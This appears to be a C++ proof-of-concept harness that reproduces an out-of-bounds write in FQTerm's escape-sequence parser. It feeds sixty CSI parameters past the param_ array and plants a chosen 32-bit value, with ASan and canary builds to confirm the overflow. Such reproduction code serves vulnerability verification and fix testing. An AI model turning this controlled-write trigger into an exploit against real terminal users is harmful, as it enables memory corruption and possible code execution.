
/* ---- declared stub FSM dispatch + harness main (not pinned bytes) ---- */
#ifdef ASAN_BUILD
/* Allocation is exactly one FQTermDecode: the out-of-range store crosses the
   ASan allocation boundary at param_[55] (offset 280 == sizeof object). */
using Obj = FQTermDecode;
static FQTermDecode& dec(Obj& o) { return o; }
#else
/* Plain build appends a 0xa5 canary so chosen bytes can be read after the
   store; the real object has no such canary. */
struct Obj { FQTermDecode d; unsigned char canary[512]; };
static FQTermDecode& dec(Obj& o) { return o.d; }
#endif

static const int NPARAM = 60;          /* separators driven past param_[30] */
static const int SLOT35 = 35;          /* slot used for the chosen 32-bit value */

static void feed(Obj& o, const char c) {
    /* Mirrors pinned bracket_state_ entries: digit -> paramDigit(), ';' ->
       nextParam(), '[' -> clearParam(). Dispatch table itself is a stub. */
    FQTermDecode& d = dec(o);
    d.inputData_ = &c;
    d.inputLength_ = 1;
    d.dataIndex_ = 0;
    if (c >= '0' && c <= '9') d.paramDigit();
    else if (c == ';')        d.nextParam();
    else if (c == '[')        d.clearParam();
}

static void put_digits(Obj& o, const char* digits) {
    for (const char* p = digits; *p; ++p) feed(o, *p);
}

int main(int argc, char** argv) {
    const char* sc = argc > 1 ? argv[1] : "baseline";
    Obj* op = new Obj;
    std::memset(op, 0, sizeof(*op));
    Obj& o = *op;
    FQTermDecode& d = dec(o);
    feed(o, '[');                      /* CSI entry clears the param table */
    if (std::strcmp(sc, "baseline") == 0) {
        put_digits(o, "1"); feed(o, ';');
        put_digits(o, "2"); feed(o, ';');
        put_digits(o, "3");
    } else {                           /* oob-chosen and fixed-same */
        for (int i = 0; i < NPARAM; ++i) {
            if (i == SLOT35) put_digits(o, "1515870810"); /* 0x5A5A5A5A */
            else             feed(o, '9');                /* 0x09 */
            if (i != NPARAM - 1) feed(o, ';');
        }
    }
    std::printf("rc=0 scenario=%s paramIndex=%d p0=%d p29=%d\n",
                sc, d.paramIndex_, d.param_[0], d.param_[29]);
    std::printf("sizeof_obj=%zu off_param=%zu off_end=%zu\n",
                sizeof(FQTermDecode),
                (size_t)((char*)d.param_ - (char*)&d),
                (size_t)((char*)&d + sizeof(FQTermDecode) - (char*)&d));
#ifndef ASAN_BUILD
    std::printf("slot35=%08x\n", (unsigned)d.param_[SLOT35]);
    std::printf("canary:");
    for (int i = 0; i < 16; ++i) std::printf(" %02x", o.canary[i]);
    std::printf("\n");
#endif
    delete op;
    return 0;
}
